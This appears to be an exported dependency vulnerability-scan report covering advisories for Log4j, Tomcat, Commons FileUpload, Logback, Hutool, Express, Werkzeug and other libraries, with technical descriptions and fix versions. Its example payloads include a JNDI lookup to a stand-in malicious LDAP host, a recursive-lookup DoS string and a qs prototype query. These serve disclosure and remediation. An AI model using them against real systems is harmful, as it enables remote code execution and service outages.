Apache Commons FileUpload does not sufficiently limit the the number of request parts that can be received via user input. An attacker can exploit this flaw by supplying a malicious upload or series of uploads and cause excessive resource allocation. This can trigger a denial-of-service (DoS).

**Note:** This vulnerability was not properly fixed in Apache Tomcat and required an additional disclosure as **CVE-2023-28709** (**BDSA-2023-1242**). The fix for Apache Commons FileUpload was not affected.

Apache Commons IO is vulnerable to excessive resource consumption in its 'XmlStreamReader' component. A remote attacker able to supply the application with specially crafted XML content could cause a denial-of-service (DoS).
Apache Commons IO contains a path traversal vulnerability. Successfully exploiting this could allow an attacker access to files they do not have permission to view.

** UNSUPPORTED WHEN ASSIGNED **

When using the Chainsaw or SocketAppender components with Log4j 1.x on JRE less than 1.7, an attacker that manages to cause a logging entry involving a specially-crafted (ie, deeply nested) 
hashmap or hashtable (depending on which logging component is in use) to be processed could exhaust the available memory in the virtual machine and achieve Denial of Service when the object is deserialized.

This issue affects Apache Log4j before 2. Affected users are recommended to update to Log4j 2.x.

NOTE: This vulnerability only affects products that are no longer supported by the maintainer.
Apache chainsaw is vulnerable to a deserialization of untrusted data flaw. A remote attacker could leverage this to cause remote code execution (RCE).

Apache Log4j is vulnerable to a remote code execution (RCE) issue due to how the Apache Chainsaw component can unsafely deserialize user controlled input.

An attacker could send crafted input to the application in order to abuse the flaw and execute malicious code on the system.

**Note**: The Apache Chainsaw deserialization vulnerability has been reported as **CVE-2020-9493** and affects EOL Apache Log4j **1.2.x** versions that include this component.

Log4j is vulnerable to remote code execution (RCE) due to the deserialization of untrusted data. An attacker that is able to make the JMSSink component submit requests to a given LDAP server could load malicious Java classes into the vulnerable application's memory by leveraging the JNDI class-loading capability.

In order to exploit this vulnerability, the attacker must be able to control the configuration of Log4j, or must have access to an LDAP server which the JMSSink component is configured to use. Log4j must also be configured to utilize JMSSink, which is not used by default.

Apache Log4j **1.2.x** versions are vulnerable to SQL injection (SQLi). This may allow an attacker to insert SQL queries into messages being logged that will get executed against a backend database. 

**Note:** This issue  affects versions **1.2.x** that are configured to use the `JDBCAppender`. The vendor states that Log4j 1 is no longer maintained and this issue will not be fixed.

Log4j **1.x** versions are vulnerable to deserializing untrusted data if configured to use `JMSAppender` (which is not the default). A remote attacker could leverage this to execute arbitrary code on the underlying system with the privileges of the application that is running Log4j.

**Note** that Log4j **1.x** has been marked EOL for many years and has not received updates in this time.

Apache Log4j is vulnerable to man-in-the-middle (MITM) attacks due to improper SSL certificate validation due to host name mismatch. An attacker could exploit this by mounting a man-in-the-middle attack which could leak log messages sent through SMTPS.

Apache Log4j is vulnerable to remote code execution (RCE).  This allows a remote attacker to send a crafted serialized payload that, when processed by Log4j, will execute arbitrary code. This can occur if Log4j is deserializing untrusted network traffic.

Apache Log4j contains a remote code execution (RCE) vulnerability. This allows an attacker that has permissions to modify the logging configuration files to input a malicious JDBC Appender with a data source referencing a JDNI URI. This can then lead to RCE.

**Note:** This vulnerability impacts log4j-core.

Apache log4j is vulnerable to a denial-of-service (DoS) when uncontrolled recursion occurs through a self-referencing lookup.  An attacker can trigger a DoS with malicious input data that generates a recursive lookup  and consequent application crash.

Successful attacks require the attacker to have access to Thread Context Map (MDC) input, and for log4j configured with non-default pattern layout with a Context Lookup.

Only the log4j-core JAR file is impacted by this vulnerability. Applications using only the log4j-api JAR file without the log4j-core JAR file are not impacted.

Apache Log4j is the only Logging Services subproject affected by this vulnerability. Other projects like Log4net  are not impacted.

It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allows attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in an information leak and remote code execution in some environments and local code execution in all environments. Log4j 2.16.0 (Java 8) and 2.12.2 (Java 7) fix this issue by removing support for message lookup patterns and disabling JNDI functionality by default.

Apache Log4j, as used in many popular services, is vulnerable to improperly allowing lightweight directory access protocol (LDAP) access via Java naming and directory interface (JNDI). A remote attacker able to supply the end application with specially crafted input that is then processed by the Log4j subcomponent could cause the execution of arbitrary Java code.

**Note** 

- log4j-api packages by themselves do not contain the vulnerable functionality and are therefore unaffected. log4j-core packages and the upstream overarching source repository are affected.

- A previously suggested mitigation of setting environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` is not recommended. This mitigation has been proven inadequate against this vulnerability. 

- This vulnerability is partially fixed in [**2.15.0-rc2**](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2) by [this](https://github.com/apache/logging-log4j2/commit/001aaada7dab82c3c09cde5f8e14245dc9d8b454) com

Apache Log4j is vulnerable to man-in-the-middle (MITM) attacks due to improper SSL certificate validation due to host name mismatch. An attacker could exploit this by mounting a man-in-the-middle attack which could leak log messages sent through SMTPS.

Apache Tomcat is vulnerable to a rewrite rule bypass issue due to how some literal characters are handled.

An attacker could abuse this issue by submitting a specially crafted request that includes unexpected characters in the request URL in order to bypass rewrite rules. This issue could potentially allow security constraints to be bypassed if the rewrite rules were being used to enforce such constraints.

The vendor has noted in their official [advisory](https://lists.apache.org/thread/cpklvqwvdrp4k9hmd2l3q33j0gzy4fox) that only a subset of unlikely rewrite rule configurations are impacted.

Apache Tomcat is vulnerable to remote code execution (RCE), information disclosure, or corruption of information via a write-enabled Default Servlet. The impact of exploitation depends on the following: 

If all of the following were true, a malicious user was able to view security sensitive files and/or inject content into those files: 
* writes enabled for the default servlet (disabled by default)
* support for partial PUT (enabled by default)
* a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads
* attacker knowledge of the names of security sensitive files being uploaded
* the security sensitive files also being uploaded via partial PUT

If all of the following were true, a malicious user was able to perform remote code execution:
* writes enabled for the default servlet (disabled by default)
* support for partial PUT (enabled by default)
* application was using Tomcat's file based session persistence with the default storage locat

Apache Tomcat is vulnerable to a remote code execution (RCE) issue due to how file case sensitivity checks can be bypassed in cases where the default servlet is write enabled on a case insensitive file system, and a concurrent read and upload of the same file occurs when Tomcat is under load.

As a result of the bypass, it can be possible for an uploaded file to be treated as a JSP file. This means that during JSP compilation, it is possible for malicious code to be executed on the server.

**Note 1:**: The default servlet is not write enabled by default. This requires the read-only initialization parameter to be set to the non-default value of `false`.

**Note 2:** This issue exists due to an incomplete fix for **CVE-2024-50379** (**BDSA-2024-9762**). Additional steps to address this issue depend on the Java version used. Guidance on this has been provided by the vendor and is available in the solution.

Apache Tomcat is vulnerable to denial-of-service (DoS) due to insufficient restrictions on data uploads to the examples web application. This could allow an attacker with access to the localhost-deployed application to cause an `OutOfMemoryError`.

Apache Tomcat is vulnerable to a remote code execution (RCE) issue due to how file case sensitivity checks can be bypassed in cases where the default servlet is write enabled on a case insensitive file system, and a concurrent read and upload of the same file occurs when Tomcat is under load.

As a result of the bypass, it can be possible for an uploaded file to be treated as a JSP file. This means that during JSP compilation, it is possible for malicious code to be executed on the server.

**Note 1:**: The default servlet is not write enabled by default. This requires the read-only initialization parameter to be set to the non-default value of `false`.

**Note 2:** This issue originally received an incomplete fix due to missing mitigation steps to fully address the issue. **CVE-2024-56337** (**BDSA-2024-9919**) has been released to fully detail how to address this.
Apache Tomcat contains an unchecked error condition in custom Jakarta Authentication `ServerAuthContext` components. An attacker may exploit this in order to bypass the authentication process.

Apache Tomcat is vulnerable to denial-of-service (DoS) due to improper handling of the handshake process for TLS 1.3. This could allow an attacker to cause an `OutOfMemoryError` by targeting a system with malicious connections.

Apache Tomcat is vulnerable to a denial-of-service (DoS) issue due to how excessive HTTP headers can be mishandled with processing an HTTP/2 stream.

An attacker could submit a large amount of headers in a HTTP/2 session in order to cause a miscount of active HTTP/2 streams. This could then lead to Tomcat using an incorrect infinite timeout that allows connections to remain open when they otherwise should have been closed. These connections staying open beyond their intended lifetimes could result in performance impacts.

Apache Tomcat is vulnerable to denial-of-service (DoS) due to improper input validation in HTTP/2 request processing. A remote unauthenticated attacker could send HTTP/2 requests with headers that have lengths exceeding the configured limits to prevent the HTTP/2 stream from being reset until all of the headers have been processed. This could degrade performance of the application.

An issue has been discovered in Apache Tomcat due to incomplete cleanup operations within the WebSocket client. An attacker could exploit this in order to keep WebSocket connections open, leading to increased resource consumption and a denial-of-service (DoS) condition.

Apache Tomcat running on openSUSE Linux is vulnerable to privilege escalation due to improper permission handling in the Tomcat package. A local attacker that has access to the `tomcat` user or group could escalate their privileges to `root` user by running a payload on the target that wins a race condition with post-install section "`%post`" of the package.

**Note:** Only the openSUSE Apache Tomcat package is affected. Apache Tomcat installed on other platforms, or through other means is unaffected.

Improper Input Validation vulnerability in Apache Tomcat.Tomcat from 11.0.0-M1 through 11.0.0-M10, from 10.1.0-M1 through 10.1.15, from 9.0.0-M1 through 9.0.82 and from 8.5.0 through 8.5.95 did not correctly parse HTTP trailer headers. A trailer header that exceeded the header size limit could cause Tomcat to treat a single 
request as multiple requests leading to the possibility of request 
smuggling when behind a reverse proxy.

Users are recommended to upgrade to version 11.0.0-M11 onwards, 10.1.16 onwards, 9.0.83 onwards or 8.5.96 onwards, which fix the issue.

The HTTP/2 protocol contains a flaw related to the stream multiplexing feature that can allow for excessive resource consumption on servers operating implementations of the HTTP/2 protocol. 

The HTTP/2 protocol allows clients to signal to a server to cancel a previously opened stream by sending an `RST_STREAM` frame. Attackers can abuse this stream canceling ability by opening a large number of streams at once immediately followed by `RST_STREAM` frames. In most HTTP/2 implementations this bypasses concurrent open stream limits and causes servers to spend processing time first handling request frames and then performing stream tear downs. For the server, these operations can pile up whereas the attacker client paid minuscule bandwidth and processing costs.

[Amazon](https://aws.amazon.com/security/security-bulletins/AWS-2023-011/), [Cloudflare](https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/) and [Google](https://cloud.google.com/blog/products/identity-s

Apache Tomcat contains an information exposure vulnerability due to insufficient error handling within the internal object recycling method. An attacker could exploit this issue to gain unauthorized access to sensitive information contained within the request/response when an error occurs in recycling.

Apache Tomcat contains a denial-of-service (DoS) vulnerability due to improper session management. An attacker could exploit this vulnerability by uploading an arbitrary file, which will initialize a stream connection through the session processing which may fail to close the stream connection, resulting in the temporary file to remain stored within the disk. This could potentially lead to disk storage becoming full as the temporary files are not being removed, resulting in a denial-of-service (DoS) condition when disk memory resources have been exhausted.

Apache Tomcat is vulnerable to HTTP request smuggling due to improper parsing of HTTP trailer within the header. An attacker could exploit this vulnerability by supplying a specially crafted HTTP request containing invalid trailer field names or values from a reversed proxy, in order to bypass security access controls such as a web application firewall (WAF) or an intrusion detection system (IDS).

Apache Tomcat is vulnerable to open redirects because of insufficient input validation. This vulnerability affects ROOT (default) web applications that have been configured to use `FORM` authentication feature. It can allow an attacker to trick a victim into accessing a specially crafted URL that redirects to an attacker-controlled location.

**Note:** The scope of this vulnerability is limited to the ROOT (default) web application.

When using the RemoteIpFilter with requests received from a    reverse proxy via HTTP that include the X-Forwarded-Proto    header set to https, session cookies created by Apache Tomcat 11.0.0-M1 to 11.0.0.-M2, 10.1.0-M1 to 10.1.5, 9.0.0-M1 to 9.0.71 and 8.5.0 to 8.5.85 did not include the secure attribute. This could result in the user agent transmitting the session cookie over an insecure channel.

Apache Tomcat's `JsonErrorReportValve` module does not escape the `type`, `message` or `description` values. In cases where these values are constructed from user provided data it is possible for users to manipulate or invalidate the JSON output.

Apache Tomcat does not fully respect the intent of the `rejectIllegalHeader` configuration option to drop all requests with illegal headers. A remote attacker could potentially smuggle requests with a specially crafted `Content-Length` header when Tomcat is also behind a reverse proxy that does the same. 

**Note:** This vulnerability only manifests when `rejectIllegalHeader` is set to `false`, which is **not** the default setting for any version higher than the **8.5.x** series.

Apache Tomcat is vulnerable to a difficult to trigger concurrency issue. A remote attacker could leverage this to learn sensitive information about other HTTP responses that they should not have access to.

The form authentication example in Apache Tomcat is vulnerable to cross-site scripting (XSS). If the code for this example form is used in production it could be exploited to steal user session tokens or perform actions on other users' behalf.

Apache Tomcat's documentation incorrectly states that `EncryptInterceptor` allows Tomcat clustering to run over untrusted networks. However, `EncryptInterceptor` only provides confidentiality and integrity protection, but does not prevent the possibility of denial-of-service (DoS) attacks.

The fix for bug CVE-2020-9484 introduced a time of check, time of use vulnerability into Apache Tomcat 10.1.0-M1 to 10.1.0-M8, 10.0.0-M5 to 10.0.14, 9.0.35 to 9.0.56 and 8.5.55 to 8.5.73 that allowed a local attacker to perform actions with the privileges of the user that the Tomcat process is using. This issue is only exploitable when Tomcat is configured to persist sessions using the FileStore.

Apache Tomcat is vulnerable to denial-of-service (DoS) due to a memory leak in the HTTP upgrade handler for `WebSocket` connections. The memory leak could use up the available memory resources which would prevent Tomcat from operating normally.

body-parser is vulnerable to denial-of-service (DoS) when URL encoding is enabled. An attacker could flood a server with an overwhelming number of request using a crafted payload resulting in DoS conditions.

Express.js web framework is vulnerable to Cross-Site Scripting (XSS) due to the improper handling of user input in the `response.redirect()` function. This could allow an attacker to execute JavaScript code on the users browser.

**Note** The attacker must be in control of the input to `response.redirect()` and the user must click before the redirect occurs.

Express.js contains an open redirect vulnerability due to insufficient validation of user supplied URLs. An attacker could exploit this by providing a crafted URL when performing a redirect bypassing the redirect allow list leading to an open redirect.

qs before 6.10.3, as used in Express before 4.17.3 and other products, allows attackers to cause a Node process hang for an Express application because an __ proto__ key can be used. In many typical Express use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as a[__proto__]=b&a[__proto__]&a[length]=100000000. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4 (and therefore Express 4.17.3, which has "deps: qs@6.9.7" in its release description, is not vulnerable).

Guava is vulnerable to authorization bypass due to the use of an insecure temporary directory for certain file creation operations. A local attacker that has access to the default Java temporary directory could access files created by the `FileBackedOutputStream` class, even when they are not intended to be able to do so.

Guava creates temporary files and directories with insecure default permissions. A local attacker on the machine could learn the contents of sensitive temporary files.

**Note:** It was determined that the initial patch in version [**30.0**](https://github.com/google/guava/releases/tag/v30.0) by [this](https://github.com/google/guava/commit/fec0dbc4634006a6162cfd4d0d09c962073ddf40) commit was inadequate to fully remove the problem of insecure temporary files from Guava. It only marked a function as deprecated, but the functionality still persisted. A new solution has been released.

Servers that depend on the Guava libraries are vulnerable to denial-of-service (DoS) conditions because certain classes allocate memory without proper checks. Potential attackers can leverage this flaw to crash the software repeatedly rendering it unusable.
Hibernate Validator is vulnerable to incorrectly validating certain expression language (EL) expressions. A remote attacker could leverage this to bypass input sanitization

Hibernate-Validator is vulnerable to improper sanitization of attacker supplied input. This can result in cross-site scripting (XSS) attacks where some script code could be run on the victim's browser.

ReflectionHelper (org.hibernate.validator.util.ReflectionHelper) in Hibernate Validator 4.1.0 before 4.2.1, 4.3.x before 4.3.2, and 5.x before 5.1.2 allows attackers to bypass Java Security Manager (JSM) restrictions and execute restricted reflection calls via a crafted application.

Hutool fails to properly verify cryptographic certificates. A remote attacker who can inject themselves in a point between client and server connections can intercept and modify the data in transit.

**Note** The vendor does not regard this as a security issue stating: 
> (Translated) Hutool's understanding is that it hopes users can request content at a given address. It doesn't matter whether the content is trustworthy or not. This is left to the user to complete the judgment.
Hutool v5.8.17 and below was discovered to contain an information disclosure vulnerability via the File.createTempFile() function at /core/io/FileUtil.java.
SQL Inection vulnerability in Dromara hutool before 5.8.21 allows attacker to execute arbitrary code via the aviator template engine.
Deserialization vulnerability in Dromara Hutool v5.8.11 allows attacker to execute arbitrary code via the XmlUtil.readObjectFromXml parameter.

A vulnerability classified as problematic was found in Dromara HuTool up to 5.8.10. This vulnerability affects unknown code of the file cn.hutool.core.util.ZipUtil.java. The manipulation leads to resource consumption. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 5.8.11 is able to address this issue. It is recommended to upgrade the affected component. VDB-215974 is the identifier assigned to this vulnerability.
A stack overflow in the org.json.JSONTokener.nextValue::JSONTokener.java component of hutool-json v5.8.10 allows attackers to cause a Denial of Service (DoS) via crafted JSON or XML data.
hutool-json v5.8.10 was discovered to contain an out of memory error.
A stack overflow in the XML.toJSONObject component of hutool-json v5.8.10 allows attackers to cause a Denial of Service (DoS) via crafted JSON or XML data.

HyperSQL DataBase is vulnerable to remote code execution (RCE) due to improper input validation thus allowing unsafe reflection. An authenticated attacker could exploit this by supplying a crafted input to potentially execute code on the application.

iText RUPS is vulnerable due to improper XML external entity (XXE) handling. A remote attacker could exploit this vulnerability in order to  cause XXE attacks such as local and remote resource inclusion, port scanning and server-side request forgery (SSRF).

**Note:** iText RUPS is no longer supported. The vendor has replaced this product with i7j-RUPS.
iText v7.1.17 was discovered to contain a stack-based buffer overflow via the component ByteBuffer.append, which allows attackers to cause a Denial of Service (DoS) via a crafted PDF file.

iText v7.1.17, up to (exluding)": 7.1.18 and 7.2.2 was discovered to contain an out-of-memory error via the component readStreamBytesRaw, which allows attackers to cause a Denial of Service (DoS) via a crafted PDF file.

iText is vulnerable to XML External Entities (XXE) attacks due to how the XML parsers in use are not configured to disable external entities.

An attacker could abuse this issue by submitting a crafted PDF file that includes malicious XXE payloads within the XML data of the document in order to perform attacks that can extract files, make forged requests on a server or impact performance.
iTextPDF in iText 7 and up to (excluding 4.4.13.3) 7.1.17 allows command injection via a CompareTool filename that is mishandled on the gs (aka Ghostscript) command line in GhostscriptHelper.java.
js-bson contains an information disclosure vulnerability. This allows an attacker that is able to supply crafted data to applications using js-bson to potentially disclose information.

Bson contains a deserialization of untrusted data vulnerability due to improper handling of user input. An attacker could exploit this vulnerability through specially crafted input which could lead to the application treating the input in a way it was not intended, such as data disclosure.

Logback is vulnerable to server-side request forgery (SSRF). A local attacker could embed external links in DOCTYPE declarations in XML configuration files. This would cause the server to submit web requests to the attacker's specified location.

logback is vulnerable to arbitrary code execution due to unsafe operations within the `JaninoEventEvaluator` extension. A local privileged attacker could exploit this vulnerability by supplying a system with a malicious configuration file, either by overwriting an existing configuration or injecting an environment variable pointing to a crafted configuration.

Logback contains a denial-of-service (DoS) vulnerability. An attacker could exploit this issue by connecting to a receiver and sending maliciously crafted data, which could in turn allow them to slow the logging of events or crash the application.

Successful exploitation of this vulnerability requires that logback-receiver component is enabled and also reachable by the attacker.

Logback contains a denial-of-service (DoS) vulnerability. An attacker could exploit this issue by connecting to a receiver and sending maliciously crafted data, which could in turn allow them to slow the logging of events or crash the application.

Successful exploitation of this vulnerability requires that logback-receiver component is enabled and also reachable by the attacker.

Logback is vulnerable to remote code execution (RCE) due to missing restrictions on JNDI locations provided in the configuration file. An attacker with an access to `logback.xml` configuration file could provide a JNDI location that would load and execute malicious code from an LDAP server.

**Note:** In addition to high privileges required to access `logback.xml`, successful exploitation requires reloading poisoned configuration data. This can be achieved by an application restart or `scan="true"` set prior to the attack.

logback does not verify the SSL hostname as part of the certificate verification process. A remote attacker could leverage this to perform man-in-the-middle (MitM) attacks against applications using logback.

Logback is vulnerable to server-side request forgery (SSRF). A local attacker could embed external links in DOCTYPE declarations in XML configuration files. This would cause the server to submit web requests to the attacker's specified location.

A local privileged attacker could exploit this vulnerability by supplying a system with a malicious configuration file, either by overwriting an existing configuration or injecting an environment variable pointing to a crafted configuration.

Successful exploitation of this vulnerability requires that logback-receiver component is enabled and also reachable by the attacker.

Successful exploitation of this vulnerability requires that logback-receiver component is enabled and also reachable by the attacker.

The MongoDB driver for Node.js is vulnerable to denial-of-service (DoS) due to improper exception handling. An attacker could exploit this vulnerability by supplying an application with maliciously crafted data.

Node Semver is vulnerable due to improper handling of whitespaces. A remote unauthenticated attacker could exploit this vulnerability by providing a crafted input in order to cause a regular expression denial-of-service (ReDoS).

Path-to-RegExp is vulnerable to a regular expression denial-of-service (ReDoS) issue due to how it is possible for an inefficient expression to be generated for some routes that make use of named parameters.

The expression generated from affected routes is susceptible to excessive backtracking. An attacker could submit a crafted path input to a vulnerable application in order to trigger the backtracking flaw when attempts to match against the path are made. The inefficient matching operations could cause excessive consumption of CPU cycles and result in degraded performance for other clients.

**Note**: this issue exists due to the discovery of an incomplete fix made for **0.1.x** releases to address **CVE-2024-45296** (**BDSA-2024-6246**).

Path-to-RegExp is vulnerable to a regular expression denial-of-service (ReDoS) issue due to how it is possible for an inefficient expression to be generated for some routes that make use of named parameters.

The expression generated from affected routes is susceptible to excessive backtracking. An attacker could submit a crafted path input to a vulnerable application in order to trigger the backtracking flaw when attempts to match against the path are made. The inefficient matching operations could cause excessive consumption of CPU cycles and result in degraded performance for other clients.

**Note**: the original fix for **0.1.x** releases was discovered to be incomplete, which required a further fix disclosed under **CVE-2024-52798** (**BDSA-2024-9447**).

qs is vulnerable to denial-of-service (DoS) due to the excessive time required to process `proto` properties of the output JavaScript objects. An unauthenticated attacker could send a request with a manipulated `proto` properties and cause the Node server to freeze as it tries to process the input.

tough-cookie is vulnerable to prototype pollution due to improper handling of cookies when using `CookieJar` in `rejectPublicSuffixes=false` mode.  An attacker can use this vulnerability to override the global object prototype in order to cause unspecified impacts.

Werkzeug is vulnerable to denial-of-service (DoS) via processing malicious 'multipart/form-data' type requests. An attacker could exploit this vulnerability to manipulate the parser into allocating up to 8 times the required RAM without an upper-limit of upload size, quickly exhausting system resources.

Werkzeug is vulnerable to missing UNC paths on Windows due to relying on a python function which is broken is versions less than **3.11**. An attacker could exploit this vulnerability to create a malicious path allowing them access to sensitive data that should not be exposed, compromising the confidentiality of the system.

**Note: This vulnerability only affects Windows systems using a Python version < 3.11**

Werkzeug is vulnerable to remote code execution via cross-site request forgery (CSRF). If an attacker predicts a URL in a developers app, they could exploit this by tricking a victim in to interacting with a domain and subdomain that they control and by entering the debugger PIN. This could grant the attacker access to the debugger even if it is operating on localhost.

Werkzeug is a comprehensive WSGI web application library. If an upload of a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer. This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. This vulnerability has been patched in version 3.0.1.

Werkzeug is vulnerable to improper cookie management because it does not securely parse unprefixed cookies. This could allow an attacker to use a malicious application on an adjacent subdomain and set a cookie for Werkzeug by using an unprefixed cookie for the adjacent subdomain.

Werkzeug contains a vulnerability in the way it parses multipart form data that can result in excessive memory consumption. An attacker can exploit this flaw by supplying crafted multipart data and cause a denial-of-service (DoS).

fullDescription.text:
Apache Commons FileUpload does not sufficiently limit the the number of request parts that can be received via user input. An attacker can exploit this flaw by supplying a malicious upload or series of uploads and cause excessive resource allocation. This can trigger a denial-of-service (DoS).

**Note:** This vulnerability was not properly fixed in Apache Tomcat and required an additional disclosure as **CVE-2023-28709** (**BDSA-2023-1242**). The fix for Apache Commons FileUpload was not affected.

## Dependency tree
* sampleapp:sampleapp:0.0.1-SNAPSHOT:-maven
    * commons-fileupload:commons-fileupload:1.3.3


## Technical Description
This vulnerability exists in the `src/main/java/org/apache/commons/fileupload/FileUploadBase.java` file. The `parseRequest()` function in this file does not sufficiently limit the maximum number of file uploads per request. This could allow an attacker to cause excessive resource allocation by supplying a malicious upload or series of uploads. Exploiting this vulnerability can allow the attacker to cause a denial-of-service.

This issue has been fixed in the `src/main/java/org/apache/commons/fileupload/FileUploadBase.java` file by implementing a limit for the number of files uploaded per request.

In Apache Tomcat, this vulnerability was insufficiently fixed by including an if clause when processing the `parameterCount > limit`. This has since been changed to `parameterCount >= limit`.

## :arrow_up: Upgrade Recommendation

### For Direct Dependency Apache Commons FileUpload 1.3.3
**Short-Term:**	Apache Commons FileUpload 1.5
**Long-Term:**	Apache Commons FileUpload 1.5

## Solution
Fixed in Apache Commons FileUpload  version [**1.5-RC1**](https://github.com/apache/commons-fileupload/releases/tag/commons-fileupload-1.5-RC1) by [this](https://github.com/apache/commons-fileupload/commit/e20c04990f7420ca917e96a84cec58b13a1b3d17) commit.

The latest stable releases of Apache Commons FileUpload can be found [here](https://github.com/apache/commons-fileupload/tags).

However, it is stated that Apache Commons FileUpload does not enable any limits by default. Thus, after applying the fixing commit, the new configuration option `FileUploadBase#setFileCountMax` must be explicitly configured.

Fixed in Apache Tomcat:
* [**8.5.88**](https://github.com/apache/tomcat/releases/tag/8.5.88) by [this](https://github.com/apache/tomcat/commit/5badf94e79) commit,
* [**9.0.74**](https://github.com/apache/tomcat/releases/tag/9.0.74) by [this](https://github.com/apache/tomcat/commit/fbd8142162) commit,
* [**10.1.8**](https://github.com/apache/tomcat/releases/tag/10.1.8) by [this](https://github.com/apache/tomcat/commit/ba848da71c) commit,
* [**11.0.0-M5**](https://github.com/apache/tomcat/releases/tag/11.0.0-M5) by [this](https://github.com/apache/tomcat/commit/d53d8e7f77042cc32a3b98f589496a1ef5088e38) commit.

The latest stable releases of Apache Tomcat are available [here](https://github.com/apache/tomcat/tags).

## Technical Description
The flaw lies in the `src/main/java/org/apache/commons/io/input/XmlStreamReader.java` file's regular expression used for pattern capturing the encoding of the "xml" processing instruction. The complexity of the regular expression is 2nd degree polynomial, potentially resulting in excessive resource consumption with specially crafted XML input.

The issue was resolved by only matching the XML processing instruction at start of a document.

** UNSUPPORTED WHEN ASSIGNED **

When using the Chainsaw or SocketAppender components with Log4j 1.x on JRE less than 1.7, an attacker that manages to cause a logging entry involving a specially-crafted (ie, deeply nested) 
hashmap or hashtable (depending on which logging component is in use) to be processed could exhaust the available memory in the virtual machine and achieve Denial of Service when the object is deserialized.

This issue affects Apache Log4j before 2. Affected users are recommended to update to Log4j 2.x.

NOTE: This vulnerability only affects products that are no longer supported by the maintainer.

## Technical Description
JMSSink, as used by Log4j, can connect to a JMS server by using a connection factory that is provided by a JNDI provider. This provider can be an LDAP server which refers the host making the request to a location where they can download a connection factory class. An attacker who is able to manipulate the JMSSink configuration could modify the `TopicConnectionFactoryBindingName` setting so that JNDI requests are resolved via an LDAP server that the attacker controls. Whenever JMSSink attempts to resolve the connection factory, the attacker-controlled LDAP server will cause the vulnerable host to download a malicious class file. This class file will contain an arbitrary payload in its constructor, or in a static initialization block, that will be executed whenever the class is instantiated. The attacker could also carry out such an attack if JMSSink is already configured to resolve the connection factory class via a server that the attacker controls.

## Technical Description
The RCE vulnerability is due to the JDBC Appender not using the `JndiManager` when accessing JNDI resources. The `createConnectionSource` method in `log4j-core/src/main/java/org/apache/logging/log4j/core/appender/db/jdbc/DataSourceConnectionSource.java` performs a `lookup` with the given `jndiName`.  An attacker that is able to modify the configuration files to contain a `jdbcAppender` that has a JDNI URI in the data source can use this to achieve RCE. 

This has been fixed by using the `JndiManager`in the  `createConnectionSource` method in `DataSourceConnectionSource.java` when performing lookups using a JDNI data source.

fullDescription.text:
Apache log4j is vulnerable to a denial-of-service (DoS) when uncontrolled recursion occurs through a self-referencing lookup.  An attacker can trigger a DoS with malicious input data that generates a recursive lookup  and consequent application crash.

Successful attacks require the attacker to have access to Thread Context Map (MDC) input, and for log4j configured with non-default pattern layout with a Context Lookup.

Only the log4j-core JAR file is impacted by this vulnerability. Applications using only the log4j-api JAR file without the log4j-core JAR file are not impacted.

Apache Log4j is the only Logging Services subproject affected by this vulnerability. Other projects like Log4net  are not impacted.

## Technical Description
If log4j is configured with  non-default Pattern Layout with a Context Lookup such as `${dollar}${dollar}{ctx:loginId}`, an attacker with  control over Thread Context Map (MDC) can trigger an DoS. An example of a malicious payload is `${${::-${::-$${::-j}}}}`.  When such a payload is send to Log4j the variables are recursively expanded. Missing checks in `log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.java` result in an infinite loop and eventually a `StackOverflowError`.
  
This occurs due to a failed replacement, or expansion of a variable causing the `substitute` method in `og4j-core/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.java` to incorrectly call `replace` with the same variable.  This is an infinite loop event.

## Workaround
The vendor advises that  this vulnerability can can be mitigated through one of the following:

* In PatternLayout in the logging configuration, replace Context Lookups like `${ctx:loginId}` or `$${ctx:loginId}` with Thread Context Map patterns `(%X, %mdc, or %MDC)`.

* Alternatively,  remove references in the configuration to Context Lookups like `${ctx:loginId}` or `$${ctx:loginId}` where they originate from sources external to the application such as HTTP headers or user input.

## Technical Description
The issue arises because Log4j versions **2** and above will process specially crafted input of the form `${jndi:ldap://malicious.server/a}` and lookup and return Java code from a remote attacker controlled server. Several exploit techniques exist that leverage specific Java code paths/classes to achieve remote code execution (RCE).

The issue was partially fixed in version [**2.15.0-rc1**](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1) by [this](https://github.com/apache/logging-log4j2/commit/001aaada7dab82c3c09cde5f8e14245dc9d8b454) commit and [this](https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3) commit. This patch and release were deemed inadequate and a further release [**2.15.0-rc2**](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2) with [this](https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658) commit was made to correct the issue.

A further vulnerability has been found (BDSA-2021-3779, CVE-2021-45046) that results in a bypass of these fixes when Log4j uses non-default pattern layouts. An attacker can still achieve RCE even with these patches and noted workarounds in place. The issue was corrected in version **2.16.0-rc1**.

fullDescription.text:
Apache Tomcat is vulnerable to a rewrite rule bypass issue due to how some literal characters are handled.

An attacker could abuse this issue by submitting a specially crafted request that includes unexpected characters in the request URL in order to bypass rewrite rules. This issue could potentially allow security constraints to be bypassed if the rewrite rules were being used to enforce such constraints.

The vendor has noted in their official [advisory](https://lists.apache.org/thread/cpklvqwvdrp4k9hmd2l3q33j0gzy4fox) that only a subset of unlikely rewrite rule configurations are impacted.

## Technical Description
